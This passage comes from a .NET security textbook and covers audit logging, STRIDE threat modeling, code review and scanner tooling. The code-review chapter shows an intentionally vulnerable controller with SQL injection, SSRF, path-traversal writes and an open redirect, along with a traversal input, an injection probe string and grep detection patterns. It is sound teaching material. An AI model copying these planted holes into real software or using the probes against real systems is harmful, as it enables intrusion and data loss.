**Next:** Chapter 19 — the sensors: what to log, what to *never* log, an audit-trail middleware, correlation IDs, and error handling that helps users without helping attackers.
## Chapter 19: Logging, Auditing, and Error Handling

> "The attack you didn't detect is the one that happened twice."

### 19.1 What You Will Learn in This Chapter

Logging and monitoring failures are their own OWASP category (A09) — and the most self-inflicted one: attacks *were* visible, and nobody wrote them down. This chapter builds the security sensor stack of SecureShop: what to log, what to **never** log, a real **audit trail** (who did what, when, and whether it worked), **correlation IDs** for tracing incidents across requests, and **error handling** that helps users without leaking intelligence to attackers. Finally: how to *read* logs like a hunter.

### 19.2 Why Logging Is a Security Control (Not Just Ops Hygiene)

The three moments that define the value: **during** (rate-limiter bursts, lockouts, and 401 storms are attack telemetry — if you log them, your SIEM/alerting sees the attempt *while it happens*); **after** (every incident investigation is a log archaeology exercise: what did the attacker touch between 03:12 and 03:41?); **in court/regulatory** (GDPR's 72-hour breach notification and PCI-DSS forensics both *require* knowing what leaked — a question only logs answer). An application without audit logs cannot prove what didn't happen, either — which is sometimes the only defense a company has.

### 19.3 What to Log — and the Never List

Good security events answer four questions (a schema to memorize): **who** (identity from claims — never from input), **what** (action/route/parameters that matter), **when** (UTC timestamp), **outcome** (status, success/failure, and *why* it failed: bad password vs locked out vs expired token).

The **Never List** — values that must not reach logs (they turn your log archive into the breach's second payload — log aggregation systems have wide reader access and weak retention discipline):

| Never log | Log instead |
|---|---|
| Passwords (even "wrong" ones — people mistype them from other systems) | "login failed" + username |
| Tokens, session IDs, API keys, JWTs | token *type* + last 4 chars max |
| Full card numbers, CVV *(CVV may not be stored **anywhere** by PCI rules, ever)* | masked reference (`****4242`) |
| PII you don't need (full address, national ID) | the fact of the action |
| Untreated user input in log messages | sanitized values (below) |

**Log injection** — the injection class logs never get: a username field containing `\n` (`13` newline characters or `0A` bytes) with fake `INFO Admin login succeeded` lines. In file logs it forges records; in some SIEM parsers it buries real alerts. The one-line discipline:

```csharp
static string Sanitize(string? input) =>
    (input ?? "").Replace("\r", "\\r").Replace("\n", "\\n");    // newlines become visible text
```

Every user-influenced value written into a log message passes through it (or your logging library's structured fields — Serilog-style structured logging *writes fields as data, not interpolated text*, which resists injection by design; the hybrid habit: structured fields + sanitized values).

### 19.4 The Audit Trail, Line by Line

Logs answer "what happened in the machine"; **audit logs** answer "who did what *business action*". First the entity — add to `AppDbContext`:

```csharp
public class AuditLog
{
    public long Id { get; set; }
    public DateTime AtUtc { get; set; }
    public string? UserId { get; set; }          // 1
    public string Method { get; set; } = "";      // 2
    public string Path { get; set; } = "";
    public string? IpAddress { get; set; }
    public int StatusCode { get; set; }          // 3
    public string? TraceId { get; set; }
}
```

1. **UserId from claims** (`User.FindFirstValue(...)`), nullable: anonymous callers are recorded as `null` — never trust a "userId" *parameter* (Ch. 11's sourcing law, applied to sensors).
2. `Method`/`Path` — the action identity; status codes already tell success/failure.
3. One row per request is the *floor*; mature systems audit at the *event* level (login, role change, price change, data export) with before/after values for mutations — that is what "who changed this price from 18.50 to 0.01?" requires.

The middleware — `src/SecureShop.Web/Security/AuditMiddleware.cs`:

```csharp
public class AuditMiddleware(RequestDelegate next, IServiceScopeFactory scopeFactory)   // 1
{
    public async Task InvokeAsync(HttpContext context)
    {
        string traceId = Activity.Current?.Id ?? context.TraceIdentifier;                // 2
        context.Response.Headers["X-Correlation-ID"] = traceId;                         // 3

        try
        {
            await next(context);                                                        // 4
        }
        finally
        {
            using var scope = scopeFactory.CreateScope();                               // 5
            var db = scope.ServiceProvider.GetRequiredService<AppDbContext>();

            db.AuditLogs.Add(new AuditLog
            {
                AtUtc = DateTime.UtcNow,
                UserId = context.User.FindFirstValue(ClaimTypes.NameIdentifier),        // 6
                Method = context.Request.Method,
                Path = Sanitize(context.Request.Path),
                IpAddress = context.Connection.RemoteIpAddress?.ToString(),
                StatusCode = context.Response.StatusCode,
                TraceId = traceId
            });
            await db.SaveChangesAsync();                                                 // 7
        }
    }
}
```

1. Middleware's anatomy, now fully yours: `RequestDelegate next` = "the rest of the pipeline"; `IServiceScopeFactory` — because middleware is a **singleton**, and scoped services (our DbContext) must be created *per request inside a scope* — the Chapter 10 scoping rule, enforced by DI design. Register: `app.UseMiddleware<AuditMiddleware>()` early in the pipeline (every request passes).
2. **Correlation ID**: `Activity.Current?.Id` — .NET's ambient diagnostics context (W3C Trace Context format); `context.TraceIdentifier` is the per-request fallback. One ID that ties your audit row, application logs, and any upstream proxy/APM trace into one story.
3. Echo it in the response header — support tickets can quote it; your logs can find it in one grep.
4. Run the rest of the pipeline — in a try/finally so *failed and crashed* requests are audited too (an attack that 500s its way through is precisely the request you want recorded).
5. The `finally` block runs after the response status is known — the only place to capture the *outcome*.
6. Identity straight from validated claims, at sensor time.
7. Persist synchronously within the request path here (simple, correct for the lab). At scale: buffered queues/background writers so an audit store hiccup can't take down the app — but *never* "log-and-drop on failure": an audit trail with silent gaps is a finding all its own.

### 19.5 Error Handling: Safe by Default, Helpful in Dev

The failure pair analysts hunt for: developers leak stack traces in production (reconnaissance goldmine: framework versions, file paths, SQL fragments — remember Ch. 12's error-driven reconnaissance), or users see a bare `500` and your team sees *nothing at all* (unlogged exceptions). The .NET 8 answer, line by line:

```csharp
// SecurityApp/GlobalExceptionHandler.cs
public class GlobalExceptionHandler(ILogger<GlobalExceptionHandler> logger)
    : IExceptionHandler                                                     // 1
{
    public async ValueTask<bool> TryHandleAsync(
        HttpContext context, Exception exception, CancellationToken ct)      // 2
    {
        logger.LogError(exception, "Unhandled exception on {Path}",
                       context.Request.Path);                               // 3

        context.Response.StatusCode = StatusCodes.Status500InternalServerError;
        context.Response.ContentType = "application/problem+json";          // 4
        await context.Response.WriteAsJsonAsync(new ProblemDetails          // 5
        {
            Status = 500,
            Title = "An unexpected error occurred.",
            Instance = context.Request.Path
        }, ct);

        return true;                                                        // 6
    }
}

// Program.cs (production-style):
builder.Services.AddExceptionHandler<GlobalExceptionHandler>();            // 7
builder.Services.AddProblemDetails();
app.UseExceptionHandler();                                                 // 8
```

1. `IExceptionHandler` — .NET 8's composable handler interface: registered handlers get first crack at exceptions; return `true` = "handled".
2. The full exception in your hands — *server-side only*.
3. **The only place the exception's details go**: logs. Stack traces, message, inner exceptions — all here (with the correlation ID flowing through your logger scopes — the two halves of Chapter 19 meeting).
4. `application/problem+json` — the RFC 9457 content type for machine-readable errors.
5. **`ProblemDetails`** — the standardized error shape (`status`, `title`, `detail`, `instance`): APIs and modern front-ends parse it uniformly. Note what the client version *deliberately omits*: stack trace, exception type, file paths, SQL text. Generic title for unexpected exceptions, always — the attacker gets "an error occurred"; the operator gets everything.
6. `true` — handled; the pipeline does not fall through to the default developer page.
7. DI registration of the handler (plus MVC-specific wiring in Dev).
8. `UseExceptionHandler()` — the replacement for the template's `UseExceptionHandler("/Home/Error")` (Ch. 4) for API-style responses; MVC keeps the friendly error *page* for browsers — the dual audience from Ch. 7's cookie events, same pattern.

[ANALYST LENS] The quick error-handling audit for any .NET app: (1) hit a broken endpoint in production garb — do you get a stack trace? (immediate critical in a real target); (2) grep `app.Environment.IsDevelopment()` branches — anything verbose outside them?; (3) verify 500s produce a log entry *with correlation ID* (no log = A09 finding); (4) check for error *message* echoes of user input (reflected content + wrong content type = XSS adjacency, Ch. 13).

### 19.6 Reading Logs Like a Hunter

The pattern vocabulary that turns your new audit table into a sensor:

- **401 bursts from one IP** — password spraying/brute force (pairs with Ch. 18's limiter); **401 → 200 sequence** — successful compromise: the most important alert in the table.
- **403 patterns on admin routes** — privilege probing (Ch. 11 recon in your own logs).
- **404 storms with sequential IDs** (`/api/orders/1042, 1043, 1044…`) — enumeration scouting: your Ch. 11 fix makes these return 404s — and now the *404 storm itself* is the tell.
- **Quotes and `--` in query strings** (`?q=%27%20OR%201%3D1--`) — injection probing (Ch. 12): scanners leave fingerprints; alert on them before "success" ever happens.
- **Uniform latency anomalies** (every request 100.3ms where they used to vary) — timing-based blind injection, coinciding with Ch. 5's fixed-time comparisons.
- **429 plateaus** — limiter working as designed; check *which* partition sustained it.

One grep habit worth building today: `rg -n "Password|Token|Authorization" logs/` — your own Never List, applied retroactively to your own telemetry.

### 19.7 Recap

- Log who/what/when/outcome; identity from claims only; sanitize user input into log messages (log injection is an injection class); the Never List keeps your log archive from becoming the second breach.
- Audit middleware records *every* request (including crashed ones) with correlation IDs (`Activity.Current`), scoped correctly, never silently dropped.
- Errors: full details to logs, `ProblemDetails` (RFC 9457) to clients, `IExceptionHandler` (.NET 8) as the mechanism; stack traces in production = critical finding, silent 500s = A09 finding.
- Attackers leave readable patterns — 401/404/403 storms, probe payloads, timing plateaus — *if* you recorded them, and only if you recorded them.

**Next:** Part VII — the analyst's capstone. Chapter 20 threat-models SecureShop with STRIDE; Chapter 21 hands you the professional code-review method; Chapter 22 finishes with tools (SAST, ZAP) and your career path.
# Part VII: Becoming the Analyst

> The last three chapters are the identity you came for: modeling systems before they're built (Ch. 20), reviewing systems that exist (Ch. 21), and testing & selling the skill set (Ch. 22).

## Chapter 20: Threat Modeling with STRIDE

> "You can't test for everything. You can *think* about everything — in 90 disciplined minutes."

### 20.1 What You Will Learn in This Chapter

Threat modeling is the analyst's flagship *proactive* skill: a structured conversation about what can go wrong, held while it's still cheap to fix. You will learn the four-question method, the **STRIDE** classification (word by word), how to draw a **data flow diagram** with **trust boundaries**, and then apply the whole discipline to SecureShop — producing the same deliverable a professional hands to an architecture review board, with every threat mapped to the chapter where you already fixed it (and a short honest list of what we deliberately left unfixed).

### 20.2 History and Method

- **1999 — STRIDE is born** at Microsoft (Loren Kohnfelder & Praerit Garg): a mnemonic to help non-security engineers generate threats *systematically* — by applying six categories to each element of a diagram. It became a mandatory step in Microsoft's **Security Development Lifecycle (SDL)** after 2004: no design review without a threat model. The industry followed: STRIDE is now the default threat-modeling vocabulary of cloud vendors, banks, and standards bodies.
- **The method is four questions, in order** (Adam Shostack's framing): **1.** What are we building? (the diagram) **2.** What can go wrong? (threats, via STRIDE) **3.** What are we going to do about it? (mitigations — mapped to controls) **4.** Did we do a good job? (validation — tests, review, revisit).
- **When:** at design time (before code — its highest-leverage moment), at *every major change* (a threat model is a living document, or it's a lie), and — the analyst's retroactive version — when you inherit a system that has none (your first engagement deliverable).

### 20.3 STRIDE, Word by Word

| Letter | Threat | The question it asks | The control family that answers it | Where you applied it |
|---|---|---|---|---|
| **S** | **Spoofing** *(pretending to be someone else)* | Can someone claim an identity they don't own? | Authentication: passwords+hashing (Ch. 5-6), cookies (Ch. 7), JWT (Ch. 8), OIDC (Ch. 9) |
| **T** | **Tampering** *(changing data or code in flight or at rest)* | Can someone modify what we rely on? | Signatures on cookies/JWTs (Ch. 7-8), antiforgery (Ch. 14), TLS (Ch. 17), Data Protection (Ch. 17) |
| **R** | **Repudiation** *(denying an action happened)* | If they deny it, can we prove otherwise? | Audit logs with identity+correlation (Ch. 19) |
| **I** | **Information Disclosure** *(revealing what should stay secret)* | What leaks, to whom? | TLS, HttpOnly/Secure cookies (Ch. 7), IDOR fixes (Ch. 11), error hygiene (Ch. 19), key management (Ch. 17) |
| **D** | **Denial of Service** *(making the system unusable)* | Can this be exhausted, crashed, or wedged? | Rate limiting (Ch. 18), size limits (Ch. 16), fail-closed validation (Ch. 5), lockout economics (Ch. 6) |
| **E** | **Elevation of Privilege** *(gaining rights you shouldn't have)* | Can someone act with more authority? | Roles/claims/policies (Ch. 10), ownership checks (Ch. 11), mass-assignment defense (Ch. 11) |

STRIDE's quiet power: applied *per element of a diagram*, it turns "we don't know what could go wrong" into a mechanical 6 × N table — the difference between a brainstorm and an audit artifact.

### 20.4 Step 1 — The Data Flow Diagram (What Are We Building?)

Draw SecureShop as **four element types** (on paper, a whiteboard, or a tool — the fidelity that matters is completeness, not beauty):

- **External interactors** (rectangles): User's browser, Attacker (first-class citizen of security diagrams), External OIDC provider.
- **Processes** (circles): `SecureShop.Web` (MVC), `SecureShop.Api` (JWT-protected), Data Protection subsystem.
- **Data stores** (open rectangles): `secureshop.db` (SQLite, incl. Identity tables), `App_Data/uploads` (files), Server key ring.
- **Data flows** (arrows, labeled with protocol): HTTPS/HTML, HTTPS/JSON+Bearer, SQL, cookie traffic, token issuance.

And the element that makes it a *security* diagram — **trust boundaries** *(dashed lines crossing which data must be re-validated; drawn wherever privilege changes)*: **1.** Internet → Web (the classic edge); **2.** Web → Api (a *server-to-server* boundary — Ch. 1's warning and Ch. 18's CORS story live here); **3.** Api → Database (the inner boundary; parameterization is its contract, Ch. 12); **4.** Api → third-party fetch (the SSRF boundary, Ch. 15); **5.** Process → key ring (the crypto boundary, Ch. 17).

```
[Browser]──HTTPS──╫──►( MVC Web )──HTTPS/JSON+Bearer──╫──►( API )──SQL──╫──►(( SQLite ))
   ▲               1        │                              2 │         3      ▲
   └── cookie auth          └── same-origin HTML              │ 4              └── Id/PasswordHash/
                                                             ▼                  Review/Order rows
                                                      ( outbound URL fetch ) 5 (key ring access)
[OIDC Provider]──HTTPS tokens──╫──►( MVC Web )
```

### 20.5 Step 2 — Apply STRIDE, Element by Element

The mechanical core — a walk (abridged to the pattern; a real model does every cell):

**Element: Browser → MVC (HTTPS, cookie)** — S: cookie theft/forgery → Data Protection signature + HttpOnly/Secure/SameSite (Ch. 7). T: CSRF-forged POSTs → tokens + SameSite (Ch. 14); response tampering mid-connection → TLS (Ch. 17). I: credentials on the wire → HTTPS-only; referrer leakage → Referrer-Policy (Ch. 18). E: mass assignment via forms → view-model allow-lists (Ch. 11).

**Element: MVC → API (HTTPS, Bearer)** — S: token forgery → HS256 + locked algorithms + strong key (Ch. 8); replay → short exp + jti (Ch. 8); T: token tampering → signature validation (Ch. 8). E: API trusting "internal" caller without own checks → Ch. 11's ownership law (a *server* is a client too).

**Element: API → SQLite** — T: SQL injection → parameterization (Ch. 12). I: DB-file theft via traversal (Ch. 15) → containment + encrypted columns (Ch. 17). D: PBKDF2 inflation attacks → input length caps (Ch. 5). E: least-privilege DB account (Ch. 12 § 12.7 — *listed here as a known gap in the lab*).

**Element: API → arbitrary fetch (Ch. 15 feature)** — I: SSRF into internal services → host allow-list + scheme guard + timeout. D: huge-URL/stream DoS → size/time bounds. (Residual: DNS rebinding — documented as accepted/deferred.)

**Element: Uploads store** — T: traversal/overwrite → random server names (Ch. 16). I: executable/web-accessible uploads → App_Data + controlled serving + nosniff (Ch. 16, 18). D: zip-bomb/extensive formats → size caps (Ch. 16) — *processor-level risk documented as residual*.

**Element: Audit log store (Ch. 19)** — T: log injection → sanitization. R: repudiation → identity-at-sensor + correlation IDs. I: the Never List (the log itself as an information-disclosure *source*). D: unbounded audit growth → retention policy (*gap: not yet implemented*).

**Cross-cutting** — R everywhere: audit coverage only as good as Ch. 19's middleware placement. E: deployment keys shared across services — key-ring story (Ch. 17) — *flag: prod key sharing not yet configured* (the classic farm finding).

### 20.6 Step 3 — What We Do About It (and the Honest Gaps)

A professional threat model ends with a **gap register**, not just a victory lap. Ours:

| # | Gap | Risk | Disposition |
|---|---|---|---|
| 1 | No email verification in lab (`RequireConfirmedEmail=false`, Ch. 6) | account squatting | Fix before any real deployment |
| 2 | Least-privilege DB account not configured (lab SQLite) | SQLi blast radius | Architectural fix, documented |
| 3 | Key ring sharing for multi-node not wired (Ch. 17) | Random logouts / single-node fragility | Config fix at deployment |
| 4 | DNS rebinding on allowed SSRF hosts | Internal scanning | Accepted-for-lab; resolve-then-connect in prod |
| 5 | Audit retention/rotation absent | Log-store DoS & retention compliance | Backlog |
| 6 | Image re-encoding validation (Ch. 16 uses magic-bytes) | Parser exploitation downstream | Backlog (validate-by-decode) |
| 7 | No 2FA rollout despite Identity support (Ch. 6) | Credential stuffing resilience | Backlog, roadmap item |

The discipline this table models: *threat modeling doesn't mean fixing everything now — it means nothing is unconsidered.* Every accepted risk has a name, an owner, and a date.

### 20.7 The Deliverable (What You Hand Over)

A real threat-model document, in the order reviewers expect it: (1) scope & assumptions (versions, deployment topology, out-of-scope items); (2) the DFD with numbered trust boundaries; (3) the STRIDE table per element (threat → mitigation → status); (4) the gap register with dispositions; (5) validation notes (how/where each mitigation is tested — for us: the chapter labs *are* the tests); (6) date, author, next-review trigger. Six sections. Learn this shape — you will reuse it on every project of your career.

### 20.8 Recap

- Four questions: build a diagram, break it with STRIDE, fix by control, validate by test; when in doubt, model at design time and re-model at change time.
- Six threat words → six control families you now personally implemented on .NET: STRIDE is your map *of this guide*.
- Trust boundaries are the drawing's dashed truth: wherever data crosses one, a chapter of this guide re-validates it.
- The gap register is what separates a security theater exercise from a professional artifact — nothing unconsidered, every risk owned and dated.

**Next:** Chapter 21 — the analyst's bread and butter: reviewing code you *didn't* write, with a method, a grep pack, a walkthrough of a deliberately rotten controller, and the ASVS-mapped report that turns findings into fixed work.
## Chapter 21: Security Code Review

> "A code review is a threat model of code that already shipped."

### 21.1 What You Will Learn in This Chapter

This is the analyst's core professional act: given an unfamiliar .NET codebase, produce specific, evidenced, severity-ranked findings that developers respect and fix. You will learn the **review method** (a repeatable route through any codebase), the **grep starter pack** (every pattern from Chapters 5-19 distilled into commands), **OWASP ASVS** (the standard that makes findings credible), and — the heart of the chapter — a full walkthrough: a deliberately vulnerable controller containing eight planted flaws, reviewed *exactly* the way you'd review a client's code, findings written in professional report form.

### 21.2 The Method: Six Steps Through Any Codebase

1. **Context before code** (30 minutes that save days): What is the app? What's the deployment topology (one box? a farm? cloud metadata reachable?)? What's *crown-jewel* data? Which endpoints are internet-facing? The threat model from Ch. 20 — reconstructed or *demanded* from the client — decides what matters most.
2. **Entry-point inventory**: routes (grep `Route\(|MapControllers|Map\(`), controllers, publicly-served files, background jobs, webhooks, and *non-HTTP* doors: message queues, file shares, import folders, cron. Every finding starts at a door.
3. **Prioritize by exposure**: review unauthenticated surface first (login, register, reset, public endpoints), then business-critical actions, then internals. Attackers order your review for you — follow their economics.
4. **Trace data flow** at the three crossing points (Ch. 12-15's map): input → query (injection), input → output (XSS), input → path/URL/object (SSRF, traversal, redirects, deserialization).
5. **Check the control stack**: authN config (Ch. 5-9 options), authZ coverage (Ch. 10-11 matrix), pipeline order (Ch. 18.5), logging/error posture (Ch. 19), crypto/keys (Ch. 17).
6. **Write findings as evidence** — every claim traceable to a file and line, every recommendation referencing the standard (ASVS) so it reads as law, not taste.

### 21.3 The Grep Starter Pack (From All Previous Chapters)

Run these before reading any code — each hit is a lead, not yet a finding:

```bash
# Museum crypto & randomness (Ch. 5, 17)
rg -n "MD5|SHA1|DES|Rijndael|AesManaged|new Random\(" -g "*.cs"
# Raw SQL & interpolation (Ch. 12)
rg -n "FromSqlRaw|ExecuteSqlRaw|CommandText|TypeNameHandling" -g "*.cs"
# Output encoding escapes (Ch. 13)
rg -n "Html\.Raw|innerHTML|document\.write|eval\(" -g "*.cs" -g "*.js"
# CSRF opt-outs & antiforgery gaps (Ch. 14)
rg -n "IgnoreAntiforgeryToken|AutoValidateAntiforgeryToken" -g "*.cs"
# Dangerous deserialization (Ch. 15)
rg -n "BinaryFormatter|NetDataContractSerializer|LosFormatter|ObjectStateFormatter" -g "*.cs"
# Redirects, paths, outbound fetches (Ch. 15)
rg -n "Redirect\(|IsLocalUrl|Path\.Combine|GetByteArrayAsync|GetStringAsync" -g "*.cs"
# CORS & headers (Ch. 18)
rg -n "AllowAnyOrigin|SetIsOriginAllowed|UseCors" -g "*.cs"
# Auth gaps & secrets (Ch. 6-11, 17)
rg -n "\[AllowAnonymous\]|RequireHttpsAttribute|appsettings.*secrets|password\s*=" -g "*.cs"
rg -n "Password|Secret|Key" appsettings*.json
```

The greps are memory prompts, not conclusions: a `Path.Combine` hit becomes a finding only when you trace the second argument to user input (Ch. 15's containment test decides).

### 21.4 The Walkthrough: Reviewing a Rotten Controller

A client sends you `VendorImportController.cs` ("quick integration we did last year, just sanity-check it"). Read it once, then walk the findings — this is a *training target* (the same exercise style as a job interview's review test):

```csharp
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Data.SqlClient;

namespace LegacyShop.Api.Controllers;

[ApiController]
[Route("api/vendor-import")]
public class VendorImportController : ControllerBase                      // F1
{
    private readonly IConfiguration _config;
    private readonly IHttpClientFactory _http;

    public VendorImportController(IConfiguration config, IHttpClientFactory http)
    { _config = config; _http = http; }

    [HttpPost("run")]
    [IgnoreAntiforgeryToken]                                             // F2
    public async Task<IActionResult> Run(string vendorUrl, string apiKey) // F3
    {
        var client = _http.CreateClient();
        var feed = await client.GetStringAsync(vendorUrl);                 // F4

        using var conn = new SqlConnection(_config.GetConnectionString("Default"));
        await conn.OpenAsync();
        var sql = "DELETE FROM VendorItems; " +
                  $"INSERT INTO VendorItems SELECT * FROM OPENROWSET(BULK '{vendorUrl}', " +   // F5
                  $"DATA_SOURCE = 'x') AS b";
        var cmd = new SqlCommand(sql, conn);
        await cmd.ExecuteNonQueryAsync();

        var path = Path.Combine("c:\\imports", apiKey);                   // F6
        await System.IO.File.WriteAllTextAsync(path, feed);

        _logger.LogInformation("Vendor import done for key {Key}", apiKey);  // F7
        return Redirect(Request.Query["returnUrl"]);                     // F8
    }
}
```

**Findings, in report form** (severity by impact × exposure — CVSS thinking compressed):

---

**F-01 — CRITICAL — Missing authentication/authorization on a destructive endpoint**
Evidence: class has no `[Authorize]` (line with `// F1`); action `Run` is POSTable by anyone.
Impact: an unauthenticated attacker can trigger vendor-import (with F4/F5, full SSRF and SQL execution as downstream effects), wipe `VendorItems` (the `DELETE` runs first), and overwrite files.
Recommendation: `[Authorize(Roles = "VendorImport")]` at class level (Ch. 10); treat as a state-changing API per Ch. 14's triage ("cookie or token?" — either way, deny by default).
ASVS: V4.1 (access control architecture), V4.2 (attribute enforcement).

**F-02 — HIGH — CSRF opt-out with no compensating control**
Evidence: `[IgnoreAntiforgeryToken]` with no replacement guard.
Impact: if this API is reachable with cookies anywhere (or via the MVC host's session), a hostile page can trigger F-01's impact silently.
Recommendation: remove; bearer-auth + no cookie auth on this host = document the triage instead (Ch. 14.7); an unjustified `Ignore` is an auto-finding.
ASVS: V4.2, V3.2 (anti-CSRF).

**F-03 — HIGH — Secrets accepted via query string**
Evidence: `apiKey` parameter comes from the URL (bound from query by default on `[ApiController]` simple types).
Impact: API keys land in browser history, proxy logs, `Referer` (Ch. 2's law); keys leak by logging, not hacking.
Recommendation: move to `Authorization` header/body (`[FromHeader]`); rotate any keys already exposed (Ch. 17: history is forever).
ASVS: V3.2/V3.7 (token handling), V6.3 (secrets in transit/logging).

**F-04 — HIGH — Unrestricted SSRF**
Evidence: `GetStringAsync(vendorUrl)` fetches user-supplied URL with server privileges, no scheme/host validation.
Impact: cloud metadata credential theft (Capital One pattern, Ch. 15), internal service probing.
Recommendation: allow-list hosts + scheme guard + `AllowAutoRedirect=false` + timeout (Ch. 15's `IsAllowedFetchUrl`).
ASVS: V12.1-V12.5 (file/resource access), A10 class mapping.

**F-05 — CRITICAL — SQL injection via string interpolation (twice: C# *and* SQL layer)**
Evidence: `$"...BULK '{vendorUrl}'..."` interpolates request data into a SQL string.
Impact: arbitrary SQL under the app's connection — the 1998 bug (Ch. 12), plus `BULK`/`OPENROWSET` escalate into file-system reads *inside SQL Server*.
Recommendation: parameterize; bulk-load via a staging API or `BULK INSERT` from validated, pre-staged paths (and DB least privilege, Ch. 12.7).
ASVS: V5.3 (query parameterization).

**F-06 — HIGH — Path traversal + arbitrary file write with key file overwrite potential**
Evidence: `Path.Combine("c:\\imports", apiKey)`; `apiKey = "..\\..\\webapp\\appsettings.json"` writes attacker content anywhere writable.
Impact: config/source overwrite (RCE-adjacent on many hosts), log poisoning.
Recommendation: Ch. 15's canonicalize-then-contain + server-side random names; ideally store imports by DB ID (Ch. 16 pattern).
ASVS: V12.3, V12.4 (path validation, upload storage).

**F-07 — MEDIUM — Logging the secret**
Evidence: `LogInformation("... {Key}", apiKey)` — the key enters the log archive (with a template property, so structured log *stores* it faithfully).
Impact: the Never List (Ch. 19.3) — log readers get the credential; retention backups extend its life.
Recommendation: log identity/vendor ID, never the key (Ch. 19's replace-with column: "reference, not value").
ASVS: V7.1 (logging), V6.3 (secret protection).

**F-08 — MEDIUM — Open redirect**
Evidence: `Redirect(Request.Query["returnUrl"])` — no `IsLocalUrl` guard (Ch. 15.4).
Impact: phishing with the company's domain as the launchpad.
Recommendation: `Url.IsLocalUrl` or `LocalRedirect`; registration-match if this is an OAuth-style redirect.
ASVS: V4.3/V14.5 (redirect validation).

---

Notice what the review *was*: mechanical (the method), evidenced (file+line+payload), non-argumentative (every fix cites a chapter/ASVS item, not opinion), and **root-caused** — F-01 amplifies F-04/F-05, and the report says so: single findings understate systems; *combinations* are how breaches actually happen (the analyst's eye sees chains).

### 21.5 OWASP ASVS: The Standard That Makes You Credible

The **Application Security Verification Standard** — OWASP's 300+ requirement checklist in 14 chapters (V1 architecture → V14 config), with **Levels 1-3** (1: baseline for everything; 2: most apps handling significant data; 3: high-assurance/critical). You don't memorize it — you *cite* it:

- Map every finding to ASVS items (as above) — turns taste into requirement.
- Use its chapter structure to organize reviews: a mini-review = "pick V2, V3, V4, V5" (authn, session, access control, input).
- At a new job: ask "what ASVS level are we targeting?" — the answer (or silence) tells you the security culture in one question.

### 21.6 After the Findings: Verification, False Positives, and the Report

- **Verify before reporting** (where safe/legal): F-03/F-08 are demonstrable on a staging host with one crafted request; F-05 can be confirmed with a benign probe (`' WAITFOR...` is *not* benign — use timing-safe/dry proofs, and know the rules of engagement — never verify DoS/injection destructively on live systems).
- **False positives are tuition, not failure** — triage them honestly: "the `Path.Combine` hit was safe (constant second argument)" — a retracted finding builds more trust than a padded report.
- **The report structure** (your deliverable, every engagement): Executive summary (2 paragraphs, risk-ranked) → Scope & method → Findings (each: ID, severity, title, evidence file:line, impact, recommendation, ASVS reference) → Chains & systemic themes (e.g., "three findings share one root cause: unauthenticated integration endpoints") → Gap register (Ch. 20.6's shape) → Appendix: test details, payloads (kept out of exec hands).

### 21.7 Recap

- Six steps: context → doors → exposure-ordered review → data-flow crossings → control stack → evidenced report.
- Grep pack = pattern memory, not verdicts; each hit traced to source and sink.
- Findings = ID, severity, evidence, impact, fix, standard citation; chains beat single bugs; honest triage beats padding.
- ASVS is your authority citation and your review skeleton — Level 1/2/3 lets you *scope* like a professional.

**Next:** the final chapter: SAST/DAST tooling (`dotnet`'s own vulnerability scanning, OWASP ZAP against the live lab), the practice platforms where you sharpen legally, the certification ladder, and your 30/60/90-day plan into the profession.
## Chapter 22: Security Testing, Tools, and Your Career Path

> "The last chapter of a curriculum is the first chapter of a practice."

### 22.1 What You Will Learn in This Chapter

The professional's toolkit and roadmap: **SCA** (finding vulnerable *dependencies*), **SAST** (analyzers that read your code), **DAST** (tools that *attack* your running app — we run OWASP ZAP against SecureShop and read its findings like a professional), the practice platforms where you legally sharpen the craft, the certification ladder that matches your CV to the market, and a concrete **30/60/90-day plan** from here to your first security-analyst role. The chapter (and guide) ends with the graduation checklist — every skill, mapped to its chapter.

### 22.2 The Three Tool Families, Word by Word

- **SCA — Software Composition Analysis** *(analyzing what your software is **composed of**: the strangers' code you ship)*. Targets OWASP A06 (vulnerable components) and half of A08. In .NET, the fastest win in the entire discipline:

```bash
dotnet list package --vulnerable                    # 1
dotnet list package --outdated                       # 2
```

1. Audits your NuGet references against the **GitHub Advisory Database** and prints every package with a **CVE** *(Common Vulnerabilities and Exposures — the industry's public, numbered catalog of known security bugs)*. Run it today on SecureShop — then imagine it in CI, failing the build on new CVEs (where it belongs: automation, not memory).
2. Outdated packages — CVEs are filed against *versions*, so "outdated" is the early-warning radar. [ANALYST LENS] A06 is the laziest attack on the list: attackers scan the internet for exposed old packages *before* reading any of your clever code. Equifax died on this step (Ch. 3).

- **SAST — Static Application Security Testing** *(analyzing your code, **statically** — without running it)*. In .NET: compiler analyzers already guard several classes you studied (`Nullable` warnings — Ch. 4; `CA` security rules like `CA3001: Review code for SQL injection vulnerabilities`, `CA3003: file path injection`, `CA5394: weak randomness`). Enable, read, fix — and know their blind spot: SAST understands *shapes*, not *intent* (it flags `Path.Combine`; it cannot know whether the second argument was attacker-controlled — that's *your* Ch. 15 trace).

- **DAST — Dynamic Application Security Testing** *(testing the running application from outside, **dynamically** — as an attacker would, blind to source)*. The next section is your first DAST run. Strength: it finds what's *actually reachable and exposed*. Weakness: it only crawls what it finds, and its findings need your verification — which is why Chapters 5-21 (human judgment) are the product, and the tools are the force multiplier.

### 22.3 DAST in Practice: OWASP ZAP Against SecureShop

ZAP *(Zed Attack Proxy — OWASP's free, open-source attack proxy/scanner)* is the standard learner-to-professional DAST tool. Your first professional run, step by step:

1. **Start the targets**: both apps running (`https://localhost:7101`, `:7102`), seed some data, log in once in the embedded browser (ZAP gets your session — logged-in crawling finds more).
2. **Spider** — ZAP inventories every URL/link/form it can reach → the attack surface map (Ch. 3's concept, rendered automatically). Compare its list against your own entry-point inventory from Ch. 21 — *discrepancies are findings of their own* (endpoints nobody documented).
3. **Active Scan** — ZAP sends attack payloads (the same families you crafted by hand in Chapters 12-15: injection probes, traversal sequences, redirect abuse) and reads the responses. On SecureShop expect it to confirm, among others: **missing CSP and security headers** (Ch. 18 — did you run *with* the middleware on?), **cookie flag findings** if any endpoint relaxed them, **antiforgery absent on any POST you forgot** (Ch. 14), and possibly **500 responses** where Ch. 19's error handling isn't yet wired.
4. **Read alerts like a professional**: each has a **risk** (High/Medium/Low/Info), the request/response pair as evidence, and a CWE reference. Your job — exactly as in Ch. 21: verify (is it real?), de-duplicate (three "X-Frame-Options missing" alerts = one finding), triage by exposure, and write it up. Scanner output is *not* a report; a *reviewed* scanner output is.
